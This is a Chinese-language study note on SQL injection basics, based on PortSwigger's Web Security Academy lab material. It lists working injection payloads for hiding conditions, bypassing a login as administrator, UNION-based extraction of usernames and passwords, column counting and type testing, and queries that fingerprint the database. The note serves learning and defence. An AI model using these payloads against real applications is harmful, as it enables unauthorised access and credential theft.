# SQL injection入门

这是[PortSwigger/Web Security Academy/SQL injection](https://portswigger.net/web-security/sql-injection)的学习笔记。

非常基础的东西，可以用来了解SQL注入的常规用法。

不同的数据库有不同的语法，本文不做深入，需要的同学可以参考[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## 获取隐藏数据

注释掉后面的条件

SELECT * FROM products WHERE category = 'Gifts`'--`' AND released = 1

查询出所有的products

SELECT * FROM products WHERE category = 'Gifts`' OR 1=1--`' AND released = 1

## 改变程序逻辑

无密码登录

SELECT * FROM users WHERE username = 'administrator`'--`' AND password = ''

## 获取另一个表中的数据

列出所有的用户名和密码

SELECT name, description FROM products WHERE category = 'Gifts`' UNION SELECT username, password FROM users--`'

UNION攻击需要满足两个条件：
1. 列数与原来的查询相同
2. 数据类型与原来的查询兼容

### 判断列数的方法

使用ORDER BY N排序，当N超出列数时报错

SELECT name, description FROM products WHERE category = 'Gifts`' ORDER BY 1--`'

SELECT name, description FROM products WHERE category = 'Gifts`' ORDER BY 2--`'

SELECT name, description FROM products WHERE category = 'Gifts`' ORDER BY 3--`'

使用UNION SELECT NULL，当NULL的个数与列数一致时不报错

SELECT name, description FROM products WHERE category = 'Gifts`' UNION SELECT NULL--`'

SELECT name, description FROM products WHERE category = 'Gifts`' UNION SELECT NULL,NULL--`'

### 测试列的数据类型

得到列的数量后，就需要测试列的数据类型，原理是类型不匹配时会报错

SELECT id, name FROM products WHERE category = 'Gifts`' UNION SELECT 'a',NULL--`'

SELECT id, name FROM products WHERE category = 'Gifts`' UNION SELECT NULL,'a'--`'

### 在一列中获取多个数据

有时候需要获取多个数据但是只有一个展示列，这时就需要合并数据

SELECT name FROM products WHERE category = 'Gifts`' UNION SELECT username || '~' || password FROM users--`'

多个列需要用NULL占位

SELECT id, name FROM products WHERE category = 'Gifts`' UNION SELECT NULL, username || '~' || password FROM users--`'

## 检测数据库

发现SQL注入漏洞后，下一步是获取所用数据库的信息。

### 获取数据库的类型和版本

Database type|Query
---|---
Microsoft, MySQL|SELECT @@version
Oracle|SELECT banner FROM v$version
PostgreSQL|SELECT version()

### 获取数据库的表名和列名

Database type|Query
---|---
Microsoft, MySQL,PostgreSQL|SELECT table_name FROM information_schema.tables<br>SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
Oracle|SELECT table_name FROM all_tables<br>SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
